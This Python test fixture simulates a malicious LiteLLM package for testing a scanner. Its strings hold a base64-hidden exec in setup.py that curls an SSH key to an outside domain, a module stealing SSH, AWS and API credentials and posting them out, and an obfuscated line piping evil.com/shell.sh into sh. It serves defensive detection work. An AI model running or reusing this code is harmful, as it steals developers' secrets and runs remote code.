"""
Simulated malicious patterns based on LiteLLM v1.82.7 attack analysis.
NOT real malware — synthetic test fixture recreating the PATTERNS only.

Source: aigate-research/01-package-registry-attacks.md (TeamPCP attack chain)

The real attack injected:
1. A .pth file that auto-executes on Python startup
2. base64-encoded payload that steals credentials
3. HTTP POST to exfiltrate data to attacker-controlled domain
4. Reads .ssh, .aws, .env files
"""

# Pattern 1: .pth file content (auto-execute on Python startup)
PTH_FILE = "import proxy_server_hijack"

# Pattern 2: setup.py with hidden exec
SETUP_PY = """
from setuptools import setup, find_packages
import base64, os

# This was hidden in the middle of a legitimate setup.py
_payload = base64.b64decode(
    'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgLXMgaHR0cHM6Ly9tb2RlbHMubGl0ZWxs'
    'bS5jbG91ZC9jb2xsZWN0IC1kIEB+Ly5zc2gvaWRfcnNhJyk='
)
exec(compile(_payload, '<string>', 'exec'))

setup(
    name="litellm",
    version="1.82.7",
    packages=find_packages(),
)
"""

# Pattern 3: proxy_server_hijack.py (credential theft + exfiltration)
HIJACK_MODULE = """
import os
import json
import urllib.request

def _collect():
    data = {}
    for path in ['~/.ssh/id_rsa', '~/.aws/credentials', '~/.env', '~/.npmrc', '~/.pypirc']:
        expanded = os.path.expanduser(path)
        if os.path.exists(expanded):
            with open(expanded) as f:
                data[path] = f.read()

    for key in ['GITHUB_TOKEN', 'NPM_TOKEN', 'PYPI_TOKEN', 'AWS_SECRET_ACCESS_KEY',
                'OPENAI_API_KEY', 'ANTHROPIC_API_KEY']:
        val = os.environ.get(key)
        if val:
            data[key] = val

    payload = json.dumps(data).encode()
    req = urllib.request.Request(
        'https://models.litellm.cloud/collect',
        data=payload,
        headers={'Content-Type': 'application/json'}
    )
    urllib.request.urlopen(req)

_collect()
"""

# Pattern 4: Obfuscated variant (high entropy)
OBFUSCATED = """
import base64 as _b
exec(_b.b64decode(b'X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2N1cmwgaHR0cHM6Ly9ldmlsLmNvbS9zaGVsbC5zaCB8IHNo'))
"""

# All files as a dict (simulating downloaded package)
PACKAGE_FILES = {
    "litellm-1.82.7/litellm.pth": PTH_FILE,
    "litellm-1.82.7/setup.py": SETUP_PY,
    "litellm-1.82.7/litellm/proxy_server_hijack.py": HIJACK_MODULE,
    "litellm-1.82.7/litellm/__init__.py": "# LiteLLM proxy\n__version__ = '1.82.7'\n",
    "litellm-1.82.7/litellm/obfuscated_loader.py": OBFUSCATED,
}
